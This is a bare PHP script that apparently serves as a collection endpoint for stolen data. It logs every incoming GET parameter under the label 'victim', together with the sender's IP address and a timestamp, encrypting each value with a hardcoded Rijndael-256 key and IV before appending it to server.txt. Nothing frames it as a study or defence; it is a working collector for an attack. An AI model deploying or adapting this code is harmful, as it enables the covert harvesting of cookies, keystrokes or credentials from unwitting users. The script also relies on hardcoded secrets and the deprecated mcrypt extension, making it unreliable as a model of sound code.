<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);




$ky = 'lkirwf897+22#bbtrm8814z5qq=498j5'; // 32 * 8 = 256 bit key
$iv = '741952hheeyy66#cs!9hjv887mxx7@8y'; // 32 * 8 = 256 bit iv


if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$file = 'server.txt';
$victim2 = "IP:";
$date=date ("l dS of F Y h:i:s A"); 
$dat="Date And Time: "; 






$fp = fopen($file, 'a');
foreach($_GET as $victim => $value) {
	


	
		$etext3 = encryptRJ256($ky, $iv,  $value);

fwrite($fp, "\r\n");
fwrite($fp,"$victim2 $ipaddress");
fwrite($fp,"$dat $date");
fwrite($fp, "\r\n");
fwrite($fp,"$victim  : $etext3");

}
fwrite($fp, "\r\n");
fclose($fp);


exit;

function encryptRJ256($key,$iv,$string_to_encrypt)
{

    $rtn = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $string_to_encrypt, MCRYPT_MODE_CBC, $iv);

    $rtn = base64_encode($rtn);

    return($rtn);

}  
?>
